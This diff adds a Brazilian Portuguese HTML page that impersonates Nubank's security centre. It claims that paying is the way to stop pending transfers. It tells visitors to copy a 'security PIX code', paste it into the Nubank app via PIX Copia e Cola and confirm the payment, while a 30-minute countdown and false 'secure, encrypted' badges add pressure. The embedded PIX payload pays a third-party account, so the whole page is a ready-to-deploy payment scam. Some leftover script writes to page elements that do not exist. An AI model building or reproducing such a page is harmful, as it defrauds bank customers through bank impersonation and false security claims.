@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Proteção Financeira - Transferência Segura</title>
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    
+    body {
+      background: #f5f5f5;
+      padding: 20px;
+      color: #333;
+    }
+    
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      overflow: hidden;
+      border: 1px solid #e0e0e0;
+    }
+    
+    .header {
+      background: #490b75;
+      color: white;
+      padding: 20px;
+      text-align: center;
+      position: relative;
+      border-bottom: 5px solid #2d0755;
+    }
+    
+    .logo {
+      width: 90px;
+      height: 90px;
+      margin: 0 auto 15px;
+      background: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 3px solid #f8f0fc;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      overflow: hidden;
+    }
+    
+    .logo img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      padding: 12px;
+    }
+    
+    .header h1 {
+      font-size: 26px;
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+    
+    .header p {
+      font-size: 16px;
+      opacity: 0.9;
+    }
+    
+    .payment-section {
+      padding: 25px;
+      display: none;
+    }
+    
+    .payment-section.active {
+      display: block;
+      animation: fadeIn 0.5s;
+    }
+    
+    .security-alert {
+      background: #fff8e1;
+      border-left: 4px solid #ffc107;
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 0 8px 8px 0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .security-alert .material-icons-round {
+      color: #ff9800;
+      font-size: 24px;
+    }
+    
+    .order-summary {
+      background: #f8f0fc;
+      border-radius: 8px;
+      padding: 18px;
+      margin-bottom: 20px;
+      border-left: 4px solid #490b75;
+      position: relative;
+    }
+    
+    .order-summary h2 {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #490b75;
+    }
+    
+    .order-summary-item {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 10px;
+      padding: 5px 0;
+    }
+    
+    .order-total {
+      font-weight: bold;
+      border-top: 1px solid #e1bee7;
+      padding-top: 12px;
+      margin-top: 12px;
+      font-size: 18px;
+      color: #490b75;
+    }
+    
+    .pix-instructions {
+      background: #f3e5f5;
+      border-radius: 8px;
+      padding: 18px;
+      margin-bottom: 20px;
+      border-left: 4px solid #490b75;
+    }
+    
+    .pix-instructions h3 {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 12px;
+      color: #490b75;
+    }
+    
+    .pix-instructions ol {
+      padding-left: 24px;
+    }
+    
+    .pix-instructions li {
+      margin-bottom: 10px;
+      line-height: 1.5;
+    }
+    
+    .pix-code-container {
+      margin-bottom: 20px;
+      position: relative;
+    }
+    
+    .pix-code-container p {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 10px;
+      font-weight: 500;
+    }
+    
+    #codigoPix {
+      width: 100%;
+      height: 120px;
+      padding: 15px;
+      border: 1px solid #d1c4e9;
+      border-radius: 8px;
+      font-family: monospace;
+      resize: none;
+      margin-bottom: 10px;
+      background: #faf5ff;
+      border-color: #490b75;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    
+    #copiarBtn {
+      background: #490b75;
+      color: white;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: all 0.3s;
+      box-shadow: 0 2px 5px rgba(73,11,117,0.2);
+    }
+    
+    #copiarBtn:hover {
+      background: #3a095e;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(73,11,117,0.3);
+    }
+    
+    .message {
+      text-align: center;
+      margin-top: 10px;
+      color: #490b75;
+      font-weight: 500;
+      height: 20px;
+      font-size: 14px;
+    }
+    
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0,0,0,0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s;
+      z-index: 1000;
+    }
+    
+    .modal-overlay.active {
+      opacity: 1;
+      pointer-events: all;
+    }
+    
+    .modal {
+      background: white;
+      border-radius: 10px;
+      padding: 25px;
+      max-width: 420px;
+      width: 90%;
+      border-top: 5px solid #490b75;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    }
+    
+    .modal h3 {
+      color: #490b75;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    
+    .modal ol {
+      padding-left: 24px;
+      margin-bottom: 25px;
+    }
+    
+    .modal li {
+      margin-bottom: 12px;
+      line-height: 1.5;
+    }
+    
+    #closeModalBtn {
+      background: #490b75;
+      color: white;
+      border: none;
+      padding: 12px 15px;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      font-weight: 600;
+      transition: background 0.3s;
+    }
+    
+    #closeModalBtn:hover {
+      background: #3a095e;
+    }
+    
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 20px;
+      color: #490b75;
+      font-weight: 700;
+      font-size: 15px;
+      padding: 12px;
+      background: #f3e5f5;
+      border-radius: 8px;
+    }
+    
+    .security-badge .material-icons-round {
+      font-size: 22px;
+    }
+    
+    .timer {
+      text-align: center;
+      margin-top: 15px;
+      color: #490b75;
+      font-weight: 600;
+      font-size: 14px;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .verified-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: #e8f5e9;
+      color: #2e7d32;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 600;
+      margin-left: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="logo">
+        <img src="https://www.mobills.com.br/blog/wp-content/uploads/2021/12/Nubank-Banco-Digital-para-Investir.jpg" alt="Logo Nubank">
+      </div>
+      <h1>Central de Segurança</h1>
+<p>Proteção Nubank - Sua segurança em primeiro lugar</p>
+    
+    </div>
+    
+
+
+
+    <div class="payment-section" id="paymentSection">
+      <div class="security-alert">
+        <span class="material-icons-round">verified_user</span>
+        <div>Esta é uma etapa necessária para interromper transferências em andamento ou agendadas.</div>
+      </div>
+      
+      
+      
+      <div class="pix-instructions">
+        <h3><span class="material-icons-round">vpn_key</span>Siga as instruções:</h3>
+        <ol>
+          <li><strong>Copie o código PIX de segurança abaixo</strong> </li>
+          <li><strong>Abra seu aplicativo bancário Nubank</strong> </li>
+          <li><strong>Selecione "Transferência PIX"</strong></li>
+          <li><strong>Escolha "PIX Copia e Cola"</strong> - método mais seguro</li>
+          <li><strong>Cole o código e confirme</strong> - com seu token de segurança</li>
+        </ol>
+      </div>
+      
+      <div class="pix-code-container">
+        <p><span class="material-icons-round">qr_code</span>Código PIX seguro </p>
+        <textarea id="codigoPix" readonly>00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/07a620142034496e81f802a453d352495204000053039865802BR5905EFISA6008SAOPAULO62070503***630451EC</textarea>
+        <button id="copiarBtn">
+          <span class="material-icons-round">content_copy</span>
+          Copiar Código Seguro
+        </button>
+        <div class="message" id="msgCopiado"></div>
+        
+        <div class="timer">
+          <span class="material-icons-round">schedule</span> Tempo restante: <span id="countdown">30:00</span>
+        </div>
+        
+        <div class="security-badge">
+          <span class="material-icons-round">lock</span>
+          <span>Transferência 100% Segura | Criptografia de ponta a ponta</span>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal">
+      <h3><span class="material-icons-round">security</span>Instruções de Segurança</h3>
+      <ol>
+        <li><strong>Abra o aplicativo Nubank</strong></li>
+        <li><strong>Procure Área Pix</strong></li>
+        <li><strong>Selecione Pix copia e Cola</strong></li>
+        <li><strong>Cole a Chave Segura</strong> - </li>
+        <li><strong>Finalize a operação com Criptografia avançada (LivePix)</strong> - Para sua seguraça.</li>
+              </ol>
+      <button id="closeModalBtn">Entendi e aceito as condições de segurança</button>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // Elementos da página
+      const paymentSection = document.getElementById('paymentSection');
+      const copiarBtn = document.getElementById('copiarBtn');
+      const codigoPix = document.getElementById('codigoPix');
+      const msgCopiado = document.getElementById('msgCopiado');
+      const modalOverlay = document.getElementById('modalOverlay');
+      const closeModalBtn = document.getElementById('closeModalBtn');
+      const countdownElement = document.getElementById('countdown');
+      
+      // Mostra a seção de pagamento
+      paymentSection.classList.add('active');
+      
+      // Temporizador de 30 minutos
+      let timeLeft = 30 * 60; // 30 minutos em segundos
+      
+      function updateCountdown() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+          countdownElement.innerHTML = '<span style="color:#d32f2f;">Expirado!</span>';
+          codigoPix.style.backgroundColor = '#ffebee';
+          codigoPix.style.borderColor = '#d32f2f';
+        } else {
+          timeLeft--;
+        }
+      }
+      
+      const countdownInterval = setInterval(updateCountdown, 1000);
+      updateCountdown();
+      
+      // Função para copiar o código PIX
+      copiarBtn.addEventListener('click', function() {
+        codigoPix.select();
+        codigoPix.setSelectionRange(0, 99999);
+        
+        try {
+          navigator.clipboard.writeText(codigoPix.value)
+            .then(() => {
+              msgCopiado.textContent = 'Código copiado com segurança!';
+              setTimeout(() => msgCopiado.textContent = '', 3000);
+              modalOverlay.classList.add('active');
+            })
+            .catch(err => {
+              msgCopiado.textContent = 'Erro ao copiar: ' + err;
+              setTimeout(() => msgCopiado.textContent = '', 3000);
+            });
+        } catch (err) {
+          document.execCommand('copy');
+          msgCopiado.textContent = 'Código copiado com segurança!';
+          setTimeout(() => msgCopiado.textContent = '', 3000);
+          modalOverlay.classList.add('active');
+        }
+      });
+      
+      // Fechar modal
+      closeModalBtn.addEventListener('click', function() {
+        modalOverlay.classList.remove('active');
+      });
+      
+      // Fechar modal ao clicar fora
+      modalOverlay.addEventListener('click', function(e) {
+        if (e.target === modalOverlay) {
+          modalOverlay.classList.remove('active');
+        }
+      });
+      
+      // Fechar modal com ESC
+      document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape' && modalOverlay.classList.contains('active')) {
+          modalOverlay.classList.remove('active');
+        }
+      });
+      
+      // Simular dados (em produção viriam de uma API)
+      function carregarDadosPedido() {
+        document.getElementById('delivery-fee').textContent = 'R$ 1.000,00';
+        document.getElementById('order-total').textContent = '100%';
+        document.getElementById('codigoPix').value = '00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/07a620142034496e81f802a453d352495204000053039865802BR5905EFISA6008SAOPAULO62070503***630451EC';
+      }
+      
+      carregarDadosPedido();
+    });
+  </script>
+</body>
+
+</html>
+
